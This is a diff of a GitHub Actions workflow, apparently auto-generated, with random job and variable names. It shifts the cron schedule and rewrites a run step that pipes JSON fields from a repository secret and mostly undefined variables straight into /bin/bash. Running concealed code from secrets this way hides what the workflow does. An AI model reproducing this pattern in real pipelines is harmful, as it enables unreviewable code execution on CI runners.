@@ -1,8 +1,10 @@
 name: duanhongriyu
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 5/6 * * *'
+    - cron: '33 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: duanhongriyu
         env:
-          ppj189: ${{ secrets.ppj189 }}
+          vt4765: ${{ secrets.vt4765 }}
         run: |
-          echo $ppj189 | jq -r .cg5434 | /bin/bash
-          echo $k328 | jq -r .wve98903 | /bin/bash
-          echo $avh42 | jq -r .tr655 | /bin/bash
-          echo $xfrq28 | jq -r .rq41958 | /bin/bash
-          echo $gp77 | jq -r .n1 | /bin/bash
-          echo $xng1 | jq -r .wzqp342 | /bin/bash
-          echo $oyre20 | jq -r .qawq155 | /bin/bash
+          echo $vt4765 | jq -r .sh80634 | /bin/bash
+          echo $v59 | jq -r .juvbw31636 | /bin/bash
+          echo $tka96 | jq -r .jezu6 | /bin/bash
+          echo $sx635 | jq -r .if5581 | /bin/bash
+          echo $lvfrc78 | jq -r .dy962 | /bin/bash
+          echo $q8131 | jq -r .danv56 | /bin/bash
+          echo $cw233 | jq -r .ebk40771 | /bin/bash
+          echo $eof431 | jq -r .zngz59 | /bin/bash
+          echo $vjue80898 | jq -r .jxrne5225 | /bin/bash
+          echo $wne0727 | jq -r .rv8543 | /bin/bash
+          echo $llj516 | jq -r .lze4 | /bin/bash
+          echo $i2 | jq -r .q86389 | /bin/bash
+          echo $zklrr79 | jq -r .tn0 | /bin/bash
+          echo $mo0 | jq -r .q07 | /bin/bash
+          echo $gcrug56 | jq -r .n09054 | /bin/bash
+          echo $b660 | jq -r .bff0157 | /bin/bash
+          echo $igkxb032 | jq -r .snu59703 | /bin/bash
 
